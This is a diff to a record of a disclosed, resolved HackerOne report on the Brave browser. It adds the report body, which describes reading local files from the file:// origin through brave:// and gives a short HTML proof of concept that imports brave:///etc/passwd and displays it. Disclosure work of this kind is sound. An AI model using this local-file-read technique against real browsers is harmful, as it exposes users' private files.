@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2018-09-29
 submitted: 2018-08-03T23:06:57.182Z
 bounty_usd: null
@@ -24,6 +25,53 @@ title: "Local files reading from the 'file://' origin through `brave://`"
 - Report: [https://hackerone.com/reports/390362](https://hackerone.com/reports/390362)
 - CWE: N/A
 - Submitted: 2018-08-03T23:06:57.182Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary:
+
+Sadly, fix for #390013 works only for web. Loading `brave://` from the `file://` origin allows reading local files on the device.
+
+> I said that fix could be insufficient 😈
+
+`file://` and `brave://` both are local origins. That means it's possible to access `brave://` from `file://` and vice versa.
+
+## Products affected: 
+
+Brave: 0.23.77 
+V8: 6.8.275.24 
+rev: 0125b5f5ddc7eebc832ceeb4f4275230ec49d149 
+Muon: 8.0.6 
+OS Release: 17.7.0 
+Update Channel: Релиз 
+OS Architecture: x64 
+OS Platform: macOS 
+Node.js: 7.9.0 
+Brave Sync: v1.4.2 
+libchromiumcontent: 68.0.3440.84
+
+## Steps To Reproduce:
+
+```html
+<head>
+    <script>
+        function show() {
+            var file = link.import.querySelector('body')
+            alert(file.innerHTML)
+        }
+    </script>
+    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
+</head>
+```
+## Supporting Material/References:
+
+Screencast + PoC attached.
+
+## Impact
+
+Local files reading should be denied.
 
 ## Timeline
 
